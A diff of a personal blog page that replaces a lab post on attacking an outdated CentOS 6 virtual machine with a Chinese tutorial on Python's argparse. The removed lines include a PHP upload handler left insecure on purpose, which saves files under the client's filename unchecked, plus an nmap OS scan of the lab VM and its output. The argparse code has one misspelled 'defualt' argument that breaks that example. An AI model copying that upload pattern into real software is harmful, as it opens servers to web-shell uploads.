@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html><head>
-<title>攻击 CentOS6 虚拟机</title>
+<title>Python 学习笔记——ArgParse</title>
 
 
 
@@ -10,18 +10,18 @@
 <meta name="google-site-verification" content="twaX9bmrayAeCFiSLFsfosnmEjKpOlWNLIYKt5ZIno4">
 <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
 <meta content="telephone=no" name="format-detection">
-<meta name="description" content="关于更新的意义...">
+<meta name="description" content="Python 学习笔记之 ArgParse 的使用，可以使 Python 程序在命令行中加选项...">
 <meta name="renderer" content="webkit">
 <meta name="theme-color" content="#ffffff">
 
 
 
-<meta property="og:title" content="攻击 CentOS6 虚拟机" />
-<meta property="og:description" content="关于更新的意义..." />
+<meta property="og:title" content="Python 学习笔记——ArgParse" />
+<meta property="og:description" content="Python 学习笔记之 ArgParse 的使用，可以使 Python 程序在命令行中加选项..." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://weepingdogel.github.io/posts/2020-09-26/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2020-09-26T13:14:18&#43;08:00" />
-<meta property="article:modified_time" content="2020-09-26T13:14:18&#43;08:00" /><meta property="og:site_name" content="WeepingDogel&#39;s Blog" />
+<meta property="og:url" content="https://weepingdogel.github.io/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-argparse/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-05-16T18:21:05&#43;08:00" />
+<meta property="article:modified_time" content="2021-05-16T18:21:05&#43;08:00" /><meta property="og:site_name" content="WeepingDogel&#39;s Blog" />
 
 
 
@@ -29,8 +29,8 @@
 
 
 <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="攻击 CentOS6 虚拟机"/>
-<meta name="twitter:description" content="关于更新的意义..."/>
+<meta name="twitter:title" content="Python 学习笔记——ArgParse"/>
+<meta name="twitter:description" content="Python 学习笔记之 ArgParse 的使用，可以使 Python 程序在命令行中加选项..."/>
 
 
 
@@ -254,8 +254,8 @@ Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> b
 						
 						
 							<li>
-								<a href="#%e6%a8%a1%e6%8b%9f%e7%8e%af%e5%a2%83" onclick="onNavClick(`#模拟环境-nav`)" id="模拟环境-nav">
-									模拟环境
+								<a href="#%e5%88%9b%e5%bb%ba-parser--%e6%b7%bb%e5%8a%a0%e9%80%89%e9%a1%b9" onclick="onNavClick(`#创建-parser--添加选项-nav`)" id="创建-parser--添加选项-nav">
+									创建 Parser &amp;&amp; 添加选项
 								</a>
 							</li>
 						
@@ -272,8 +272,8 @@ Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> b
 						
 						
 							<li>
-								<a href="#%e6%94%bb%e5%87%bb%e8%bf%87%e7%a8%8b" onclick="onNavClick(`#攻击过程-nav`)" id="攻击过程-nav">
-									攻击过程
+								<a href="#%e8%b0%83%e7%94%a8%e8%8e%b7%e5%8f%96%e5%88%b0%e7%9a%84%e9%80%89%e9%a1%b9%e5%8f%82%e6%95%b0" onclick="onNavClick(`#调用获取到的选项参数-nav`)" id="调用获取到的选项参数-nav">
+									调用获取到的选项参数
 								</a>
 							</li>
 						
@@ -292,6 +292,24 @@ Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> b
 							<li>
 								<a href="#%e7%bb%93%e8%af%ad" onclick="onNavClick(`#结语-nav`)" id="结语-nav">
 									结语
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e5%8f%82%e8%80%83%e9%93%be%e6%8e%a5" onclick="onNavClick(`#参考链接-nav`)" id="参考链接-nav">
+									参考链接
 								</a>
 							</li>
 						
@@ -433,8 +451,8 @@ Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> b
 						
 						
 							<li>
-								<a href="#%e6%a8%a1%e6%8b%9f%e7%8e%af%e5%a2%83" onclick="onNavClick(`#模拟环境-nav`)" id="模拟环境-nav">
-									模拟环境
+								<a href="#%e5%88%9b%e5%bb%ba-parser--%e6%b7%bb%e5%8a%a0%e9%80%89%e9%a1%b9" onclick="onNavClick(`#创建-parser--添加选项-nav`)" id="创建-parser--添加选项-nav">
+									创建 Parser &amp;&amp; 添加选项
 								</a>
 							</li>
 						
@@ -451,8 +469,8 @@ Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> b
 						
 						
 							<li>
-								<a href="#%e6%94%bb%e5%87%bb%e8%bf%87%e7%a8%8b" onclick="onNavClick(`#攻击过程-nav`)" id="攻击过程-nav">
-									攻击过程
+								<a href="#%e8%b0%83%e7%94%a8%e8%8e%b7%e5%8f%96%e5%88%b0%e7%9a%84%e9%80%89%e9%a1%b9%e5%8f%82%e6%95%b0" onclick="onNavClick(`#调用获取到的选项参数-nav`)" id="调用获取到的选项参数-nav">
+									调用获取到的选项参数
 								</a>
 							</li>
 						
@@ -471,6 +489,24 @@ Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> b
 							<li>
 								<a href="#%e7%bb%93%e8%af%ad" onclick="onNavClick(`#结语-nav`)" id="结语-nav">
 									结语
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e5%8f%82%e8%80%83%e9%93%be%e6%8e%a5" onclick="onNavClick(`#参考链接-nav`)" id="参考链接-nav">
+									参考链接
 								</a>
 							</li>
 						
@@ -537,40 +573,43 @@ Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> b
                 
                     
                     
-                    style="background-image: url('https://w.wallhaven.cc/full/5w/wallhaven-5we787.jpg')"
+                    style="background-image: url('https://weepingdogel.github.io/img/2021-05-16-18-25-46%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png')"
                     
                 
             >
                 <div class="post-title">
-                    攻击 CentOS6 虚拟机
+                    Python 学习笔记——ArgParse
                     
                     <div class="post-subtitle">
-                        关于更新的意义...
+                        Python 学习笔记之 ArgParse 的使用，可以使 Python 程序在命令行中加选项...
                     </div>
                     
                     <div class="post-meta">
                         
                         <time itemprop="datePublished">
-                            2020-09-26 13:14
+                            2021-05-16 18:21
                         </time>
                         
 
                         
                             <i class="material-icons" style="">folder</i>
-                                <a href="/categories/other">Other</a>
+                                <a href="/categories/%E7%BC%96%E7%A8%8B">编程</a>
                                 &nbsp;
                         
 
                         
                             <i class="material-icons" style="">label</i>
                             
+                                <a href="/tags/%E7%AC%94%E8%AE%B0">笔记</a>
+                                &nbsp;
+                            
                                 <a href="/tags/linux">Linux</a>
                                 &nbsp;
                             
-                                <a href="/tags/%E6%83%B3%E6%B3%95">想法</a>
+                                <a href="/tags/python">Python</a>
                                 &nbsp;
                             
-                                <a href="/tags/%E9%9A%8F%E7%AC%94">随笔</a>
+                                <a href="/tags/%E7%BC%96%E7%A8%8B">编程</a>
                                 &nbsp;
                             
                         
@@ -583,78 +622,145 @@ Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> b
                 
                 <div class="post-body" v-pre>
                 
-                    <blockquote>
-<p>虽然存在渗透过程，但是本篇主题不是渗透，请理性阅读。</p>
-</blockquote>
-<h1 id="序">序</h1>
-<p>最近总听到一些声音。</p>
-<p>一些关于软件更新的、不同的声音。</p>
-<p>一边说：在某些情况下，更新不好，会带来不必要的工作量，甚至重写</p>
-<p>另一边说：持续不断的更新才能带来更好的体验</p>
-<p>我不知道哪一边是对的，但有点好奇</p>
-<p>我好奇如果不更新会怎样，所以我做了这件事：用虚拟机模拟一个商业公司的服务器，系统为 CentOS 6，尝试使用一些工具试着去攻击。</p>
-<p>只是想模拟一家公司在 2020 年使用 CentOS 6.0 被黑客盯上了会怎么样。</p>
-<h1 id="模拟环境">模拟环境</h1>
+                    <h1 id="序">序</h1>
+<p>为了使 <a href="https://github.com/WeepingDogel/TitleGetter">TitleGetter</a> 更加灵活，我打算将 <code>list.txt</code> 和输出文件由用户自定， 因此这需要用到命令行选项&hellip; 就像一些我们常用到的软件一样，比如 <code>pacman</code></p>
+<p><img src="/img/2021-05-16-18-31-48%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p>
+<p>因此谷歌了一下，了解到了 <a href="https://docs.python.org/3/library/argparse.html">ArgParse</a> 这个东西</p>
 <blockquote>
-<p>攻击者平台: Arch Linux</p>
-<p>IP: 192.168.0.109</p>
-<p>受害平台: CentOS 6.1 on VirtualBox</p>
-<p>IP: 192.168.0.116</p>
+<p>The argparse module makes it easy to write user-friendly command-line interfaces. The program defines what arguments it requires, and argparse will figure out how to parse those out of sys.argv. The argparse module also automatically generates help and usage messages and issues errors when users give the program invalid arguments.</p>
+<p>From: <a href="https://docs.python.org/3/library/argparse.html">argparse â Parser for command-line options, arguments and sub-commands — Python 3.9.5 documentation</a></p>
 </blockquote>
-<p><strong>假如</strong>这是一家由非技术人员领导技术人员的公司，很长一段时间没有更新过开发时使用的软件（包括开发机、服务器的操作系统）</p>
-<p>我们将这个虚拟机想象为他们的服务器，然后进行一些攻击测试。</p>
-<p>由于这家公司的管理层是非技术人员，因此服务器的软件不仅版本老旧，且缺乏防御措施。</p>
-<p>外加公司有点不尽人意的工时，程序员们都以“完成任务”的摸鱼态度工作，导致后端 PHP 写成了这样</p>
+<p>然后我就试着敲了一个文件..</p>
+<p>运行出来的结果是这样的</p>
+<p><img src="/img/2021-05-16-18-43-35%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p>
+<p>那么接下来稍微整理一下相关的笔记吧&hellip;..</p>
+<h1 id="创建-parser--添加选项">创建 Parser &amp;&amp; 添加选项</h1>
+<p>在一切开始之前，我们需要使用 <code>argparse</code> 库里面的 <code>ArgumentParser</code> 用法来创建一个变量，命名为 &lsquo;parser&rsquo;</p>
 <div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#666">&lt;?</span>php
-<span style="color:#007020;font-weight:bold">if</span> (<span style="color:#bb60d5">$_FILES</span>[<span style="color:#4070a0">&#34;file&#34;</span>][<span style="color:#4070a0">&#34;error&#34;</span>] <span style="color:#666">&gt;</span> <span style="color:#40a070">0</span>)
-{
-    <span style="color:#007020;font-weight:bold">echo</span> <span style="color:#4070a0">&#34;错误：&#34;</span> <span style="color:#666">.</span> <span style="color:#bb60d5">$_FILES</span>[<span style="color:#4070a0">&#34;file&#34;</span>][<span style="color:#4070a0">&#34;error&#34;</span>] <span style="color:#666">.</span> <span style="color:#4070a0">&#34;&lt;br&gt;&#34;</span>;
-}
-<span style="color:#007020;font-weight:bold">else</span>
-{
-    <span style="color:#007020;font-weight:bold">echo</span> <span style="color:#4070a0">&#34;上传文件名: &#34;</span> <span style="color:#666">.</span> <span style="color:#bb60d5">$_FILES</span>[<span style="color:#4070a0">&#34;file&#34;</span>][<span style="color:#4070a0">&#34;name&#34;</span>] <span style="color:#666">.</span> <span style="color:#4070a0">&#34;&lt;br&gt;&#34;</span>;
-    <span style="color:#007020;font-weight:bold">echo</span> <span style="color:#4070a0">&#34;文件类型: &#34;</span> <span style="color:#666">.</span> <span style="color:#bb60d5">$_FILES</span>[<span style="color:#4070a0">&#34;file&#34;</span>][<span style="color:#4070a0">&#34;type&#34;</span>] <span style="color:#666">.</span> <span style="color:#4070a0">&#34;&lt;br&gt;&#34;</span>;
-    <span style="color:#007020;font-weight:bold">echo</span> <span style="color:#4070a0">&#34;文件大小: &#34;</span> <span style="color:#666">.</span> (<span style="color:#bb60d5">$_FILES</span>[<span style="color:#4070a0">&#34;file&#34;</span>][<span style="color:#4070a0">&#34;size&#34;</span>] <span style="color:#666">/</span> <span style="color:#40a070">1024</span>) <span style="color:#666">.</span> <span style="color:#4070a0">&#34; kB&lt;br&gt;&#34;</span>;
-    <span style="color:#007020;font-weight:bold">echo</span> <span style="color:#4070a0">&#34;文件临时存储的位置: &#34;</span> <span style="color:#666">.</span> <span style="color:#bb60d5">$_FILES</span>[<span style="color:#4070a0">&#34;file&#34;</span>][<span style="color:#4070a0">&#34;tmp_name&#34;</span>];
-    move_uploaded_file(<span style="color:#bb60d5">$_FILES</span>[<span style="color:#4070a0">&#34;file&#34;</span>][<span style="color:#4070a0">&#34;tmp_name&#34;</span>], <span style="color:#4070a0">&#34;upload/&#34;</span> <span style="color:#666">.</span> <span style="color:#bb60d5">$_FILES</span>[<span style="color:#4070a0">&#34;file&#34;</span>][<span style="color:#4070a0">&#34;name&#34;</span>]);
-    <span style="color:#007020;font-weight:bold">echo</span> <span style="color:#4070a0">&#34;文件存储在: &#34;</span> <span style="color:#666">.</span> <span style="color:#4070a0">&#34;upload/&#34;</span> <span style="color:#666">.</span> <span style="color:#bb60d5">$_FILES</span>[<span style="color:#4070a0">&#34;file&#34;</span>][<span style="color:#4070a0">&#34;name&#34;</span>];
-}
-<span style="color:#007020">?&gt;</span><span style="">
-</span></code></pre></td></tr></table>
+<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#007020;font-weight:bold">import</span> <span style="color:#0e84b5;font-weight:bold">argparse</span>
+parser <span style="color:#666">=</span> argparse<span style="color:#666">.</span>ArgumentParser(description<span style="color:#666">=</span><span style="color:#4070a0">&#39;&#39;</span>)
+</code></pre></td></tr></table>
 </div>
-</div><blockquote>
-<p>由于条件有限，只能模拟到这个程度，但我个人认为<del>足以进行抽象测试了</del>(逃</p>
-</blockquote>
-<h1 id="攻击过程">攻击过程</h1>
-<p>总有人喜欢搞破坏，一名黑客对服务器进行了扫描&hellip;</p>
+</div><p>这里有个参数 <code>description=''</code>， 这里是写一些说明用的&hellip;</p>
+<p>比如我们写上</p>
+<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#007020;font-weight:bold">import</span> <span style="color:#0e84b5;font-weight:bold">argparse</span>
+parser <span style="color:#666">=</span> argparse<span style="color:#666">.</span>ArgumentParser(description<span style="color:#666">=</span><span style="color:#4070a0">&#39;Welcome&#39;</span>)
+</code></pre></td></tr></table>
+</div>
+</div><p>顺便我们需要写上一些需要的选项～</p>
+<p><code>parser.add_argument()</code> 使用这个就可以了</p>
+<p>里面需要加上一些东西, 比如 <code>-a</code>、 <code>--about</code> 这些选项的使用形式</p>
+<p>最后加上 <code>args = parser.parse_args()</code></p>
+<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#007020;font-weight:bold">import</span> <span style="color:#0e84b5;font-weight:bold">argparse</span>
+parser <span style="color:#666">=</span> argparse<span style="color:#666">.</span>ArgumentParser(description<span style="color:#666">=</span><span style="color:#4070a0">&#39;Welcome&#39;</span>)
+parser<span style="color:#666">.</span>add_argument(<span style="color:#4070a0">&#39;-a&#39;</span>,<span style="color:#4070a0">&#39;--about&#39;</span>, help<span style="color:#666">=</span><span style="color:#4070a0">&#39;Show the about&#39;</span>)
+args <span style="color:#666">=</span> parser<span style="color:#666">.</span>parse_args()
+</code></pre></td></tr></table>
+</div>
+</div><p>这时我们已经可以加上 <code>-h</code> 来看看效果了</p>
 <div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo nmap -O -v 192.168.0.116
+<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ python a.py -h
 </code></pre></td></tr></table>
 </div>
-</div><p>结果是这样的</p>
+</div><div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">usage: a.py [-h] [-a ABOUT]
+
+Welcome
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -a ABOUT, --about ABOUT
+                        Show the about
+</code></pre></td></tr></table>
+</div>
+</div><p>那么这里整理一下常用的这么几个参数</p>
+<ol>
+<li><code>default</code>
+<ul>
+<li>没有设置任何参数情况下的默认参数</li>
+</ul>
+<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">parser<span style="color:#666">.</span>add_argument(<span style="color:#4070a0">&#39;-a&#39;</span>,<span style="color:#4070a0">&#39;--about&#39;</span>, help<span style="color:#666">=</span><span style="color:#4070a0">&#39;Show the about&#39;</span>, defualt<span style="color:#666">=</span><span style="color:#4070a0">&#39;text.txt&#39;</span>)
+</code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>如果用户没有设置这个参数则会自动提供一个默认的</li>
+</ul>
+</li>
+<li><code>help</code>
+<ul>
+<li>给对应的选项添加说明文字</li>
+</ul>
+</li>
+<li>required
+<ul>
+<li>用于决定这个参数是否一定需要设置</li>
+<li>如果设置了 <code>required=True</code>, 在运行时如果不设置这个参数就会报错</li>
+</ul>
+<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">parser<span style="color:#666">.</span>add_argument(<span style="color:#4070a0">&#39;-a&#39;</span>,<span style="color:#4070a0">&#39;--about&#39;</span>, required<span style="color:#666">=</span>True)
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">$ python a.py   
+usage: a.py [-h] -a ABOUT
+a.py: error: the following arguments are required: -a/--about
+</code></pre></td></tr></table>
+</div>
+</div></li>
+</ol>
+<h1 id="调用获取到的选项参数">调用获取到的选项参数</h1>
+<p>接下来我们要做的是，将获取到的参数运用起来。</p>
+<p>我们知道，当在命令行中给选项后面写上了一些东西，那么程序会默认地作为字符串而获取它，这时我们就要拿这获得的东西做我们想要做的事</p>
+<p>我简单地写了个能够将一个文件的内容写到另一个文件的脚本</p>
 <div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
@@ -677,136 +783,47 @@ Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> b
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Nmap scan report for 192.168.0.116
-Host is up (0.00028s latency).
-Not shown: 998 closed ports
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-MAC Address: 08:00:27:B7:2E:E5 (Oracle VirtualBox virtual NIC)
-Device type: general purpose
-Running: Linux 2.6.X|3.X
-OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
-OS details: Linux 2.6.32 - 3.10
-Uptime guess: 49.708 days (since Sat Aug  8 02:56:12 2020)
-Network Distance: 1 hop
-TCP Sequence Prediction: Difficulty=261 (Good luck!)
-IP ID Sequence Generation: All zeros
-
-Read data files from: /usr/bin/../share/nmap
-OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 2.13 seconds
-           Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.286KB)
+<pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#007020;font-weight:bold">import</span> <span style="color:#0e84b5;font-weight:bold">argparse</span>
+<span style="color:#007020;font-weight:bold">print</span>(<span style="color:#4070a0">&#39;&#39;&#39;                                                            
+</span><span style="color:#4070a0">By WeepingDogel
+</span><span style="color:#4070a0">&#39;&#39;&#39;</span>)
+<span style="color:#007020;font-weight:bold">def</span> <span style="color:#06287e">GetParser</span>():
+    parser <span style="color:#666">=</span> argparse<span style="color:#666">.</span>ArgumentParser(description<span style="color:#666">=</span><span style="color:#4070a0">&#39;Help&#39;</span>, epilog<span style="color:#666">=</span><span style="color:#4070a0">&#39;A new testing program.&#39;</span>)
+    parser<span style="color:#666">.</span>add_argument(<span style="color:#4070a0">&#39;-o&#39;</span>,<span style="color:#4070a0">&#39;--output&#39;</span>, help<span style="color:#666">=</span><span style="color:#4070a0">&#39;Output file&#39;</span>,default<span style="color:#666">=</span><span style="color:#4070a0">&#39;test.txt&#39;</span> , required<span style="color:#666">=</span>True)
+    parser<span style="color:#666">.</span>add_argument(<span style="color:#4070a0">&#39;-r&#39;</span>,<span style="color:#4070a0">&#39;--read&#39;</span>,help<span style="color:#666">=</span><span style="color:#4070a0">&#39;read a file&#39;</span>, required<span style="color:#666">=</span>True)
+    <span style="color:#007020;font-weight:bold">return</span> parser
+<span style="color:#007020;font-weight:bold">def</span> <span style="color:#06287e">Write</span>(content, filename):
+    f <span style="color:#666">=</span> <span style="color:#007020">open</span>(filename,<span style="color:#4070a0">&#34;a&#34;</span>)
+    f<span style="color:#666">.</span>write(content)
+    f<span style="color:#666">.</span>close()
+    <span style="color:#007020;font-weight:bold">print</span>(filename <span style="color:#666">+</span> <span style="color:#4070a0">&#39; has been written&#39;</span>)
+<span style="color:#007020;font-weight:bold">def</span> <span style="color:#06287e">Read</span>(filename):
+    f <span style="color:#666">=</span> <span style="color:#007020">open</span>(filename)
+    text <span style="color:#666">=</span> f<span style="color:#666">.</span>read()
+    <span style="color:#007020;font-weight:bold">return</span> text
+<span style="color:#007020;font-weight:bold">def</span> <span style="color:#06287e">Main</span>():
+    parser <span style="color:#666">=</span> GetParser()
+    args <span style="color:#666">=</span> parser<span style="color:#666">.</span>parse_args()
+    Write(Read(args<span style="color:#666">.</span>read),args<span style="color:#666">.</span>output)
+Main()
 </code></pre></td></tr></table>
 </div>
